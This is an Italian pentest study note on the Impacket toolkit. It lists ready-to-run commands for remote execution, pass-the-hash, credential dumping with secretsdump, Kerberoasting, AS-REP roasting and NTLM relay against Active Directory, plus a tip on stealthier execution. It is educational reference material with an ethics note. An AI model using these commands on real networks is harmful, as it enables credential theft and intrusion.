---
tipo: entita
tag: [windows, tool, ad]
fase: 2
fonti: 4
aggiornato: 2026-06-20
stato: maturo
aliases: ["Impacket"]

---

# Impacket

> Nota etica: Impacket implementa protocolli Windows a basso livello e può causare danni seri se usato su sistemi non autorizzati. Usare esclusivamente in ambienti lab con permesso esplicito.

## Cos'è

Impacket è una collezione di classi Python per lavorare con protocolli di rete Windows a basso livello: SMB, MSRPC, LDAP, Kerberos, NTLM, WMI e altri. Fornisce una serie di **script pronti all'uso** (nella cartella `examples/`) che implementano tecniche di attacco e amministrazione su ambienti Windows e [[Active Directory]]. È la base su cui si appoggiano molti altri tool del settore.

## Uso tipico

```bash
# Esecuzione remota di comandi via SMB (come psexec)
impacket-psexec DOMINIO/Administrator:Password123@192.168.1.10

# Esecuzione remota silenziosa via WMI
impacket-wmiexec DOMINIO/utente:password@192.168.1.10

# Pass-the-Hash con wmiexec
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMINIO/Administrator@192.168.1.10

# Dump hash del SAM/NTDS.dit (secretsdump)
impacket-secretsdump DOMINIO/Administrator:password@192.168.1.1

# Kerberoasting: ottieni TGS per account con SPN
impacket-GetUserSPNs -request -dc-ip 192.168.1.1 DOMINIO/utente:password

# AS-REP Roasting: account senza pre-autenticazione
impacket-GetNPUsers DOMINIO/ -usersfile utenti.txt -format hashcat -dc-ip 192.168.1.1

# Enumerare sessioni e utenti loggati
impacket-netview DOMINIO/utente:password -target 192.168.1.10

# Relay NTLM
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Quando si usa

Impacket copre quasi tutte le fasi del pentest Windows/AD:
- **Post-exploitation**: `secretsdump` per estrarre hash da SAM, LSA e NTDS.dit
- **Movimento laterale**: `psexec`, `wmiexec`, `smbexec` per esecuzione remota; [[Pass-the-Hash]]
- **Attacchi Kerberos**: [[Kerberoasting]] con `GetUserSPNs`, [[AS-REP Roasting]] con `GetNPUsers`
- **Attacchi relay**: `ntlmrelayx` per catturare e ridirigere autenticazioni NTLM
- **Accesso al DC**: `ticketer` per forging di ticket (Golden/Silver Ticket con hash krbtgt)

## Note e trucchi

- In Kali Linux i tool sono disponibili come `impacket-<nome>` (es. `impacket-secretsdump`). In alternativa si clona il repo e si usa `python examples/secretsdump.py`.
- **secretsdump** può agire anche localmente su file SAM/SYSTEM copiati (senza connessione di rete): utile per analisi forensi.
- `psexec` crea un servizio Windows visibile e lascia tracce evidenti nei log. `wmiexec` è più silenzioso.
- Impacket supporta autenticazione Kerberos con ticket `.ccache` (ottenuti da [[CrackMapExec]] o da ticket dump): `export KRB5CCNAME=ticket.ccache`.
- Installazione: `pip install impacket` oppure pre-installato in Kali/ParrotOS.

## Collegamenti

- [[SMB]]
- [[Pass-the-Hash]]
- [[Kerberoasting]]
- [[AS-REP Roasting]]
- [[CrackMapExec]]
- [[Active Directory]]
- [[Kerberos]]

## Fonti

- GitHub — Impacket: https://github.com/fortra/impacket
- HackTricks — Impacket: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/impacket
- MITRE ATT&CK T1550.002 — Pass the Hash: https://attack.mitre.org/techniques/T1550/002/
- TryHackMe — Compromising Active Directory: https://tryhackme.com/room/compromisedadmain
